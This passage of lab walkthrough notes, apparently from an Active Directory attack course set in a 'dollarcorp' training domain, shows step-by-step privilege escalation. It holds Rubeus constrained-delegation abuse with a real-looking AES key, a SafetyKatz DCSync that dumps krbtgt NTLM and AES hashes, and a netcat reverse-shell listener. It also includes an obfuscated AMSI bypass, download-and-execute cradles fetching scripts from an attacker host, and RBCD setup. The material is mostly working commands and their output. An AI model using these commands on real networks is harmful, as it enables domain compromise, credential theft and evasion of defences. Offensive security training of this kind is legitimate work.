 Volume Serial Number is 76D3-EB93

 Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$

05/08/2021  01:15 AM    <DIR>          PerfLogs
11/14/2022  05:44 AM    <DIR>          Program Files
11/14/2022  05:43 AM    <DIR>          Program Files (x86)
12/03/2023  07:36 AM    <DIR>          Transcripts
11/15/2022  02:48 AM    <DIR>          Users
10/25/2024  04:29 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,431,602,688 bytes free
```

### For the next task, enumerate the computer accounts with constrained delegation enabled using PowerView

* PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth

```
pwdlastset                    : 11/11/2022 11:16:12 PM
logoncount                    : 106
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 9/23/2025 5:02:28 AM
whencreated                   : 11/12/2022 7:16:12 AM
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 9/23/2025 12:02:28 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
objectguid                    : 2e036483-7f45-4416-8a62-893618556370
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {12/5/2024 12:47:28 PM, 11/15/2022 4:16:45 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
usncreated                    : 13891
usnchanged                    : 346339
lastlogon                     : 9/28/2025 11:02:56 AM
badpwdcount                   : 0
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : DCORP-ADMINSRV
dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local
```

### Abuse Constrained Delegation using dcorp-adminsrv with Rubeus
We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. 
Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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
      cC1hZG1pbnNydiQ=

[*] Impersonating user 'Administrator' to target SPN 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL':

      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
[+] Ticket successfully imported!
```

### Run the below command to abuse the LDAP ticket

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

```
mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz(commandline) # exit
Bye!
```

### Learning Objective 17:
```
• Find a computer object in dcorp domain where we have Write permissions. 
• Abuse the Write permissions to access that computer as Domain Admin.
```

Let's use PowerView from a PowerShell session started using Invisi-Shell to enumerate Write permissions for a user that we have compromised. 
After trying from multiple users or using BloodHound we would know that the user ciadmin has Write permissions on the computer object of dcorp-mgmt.

* C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```
ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user
```

Recall that we compromised ciadmin from dcorp-ci. 
We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci. 
Let's use the reverse shell that we have and load PowerView there.

* C:\Users\student1> cls
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

* PS C:\Users\Administrator\.jenkins\workspace\Project731> iex (iwr http://172.16.100.X/sbloggingbypass.txt -UseBasicParsing)

* Bypass AMSI
```
 S`eT-It`em ( 'V'+'aR' 
+ 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-
F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL 
)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -
f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f 
'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 
AlteredSecurity Attacking and Defending Active Directory 95
'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( 
"{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 
'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -
f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

* PS C:\Users\Administrator\.jenkins\workspace\Project731> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1'))

Now, configure RBCD on dcorp-mgmt for the student VMs. 
You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD

* PS C:\Users\Administrator\.jenkins\workspace\Project731> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
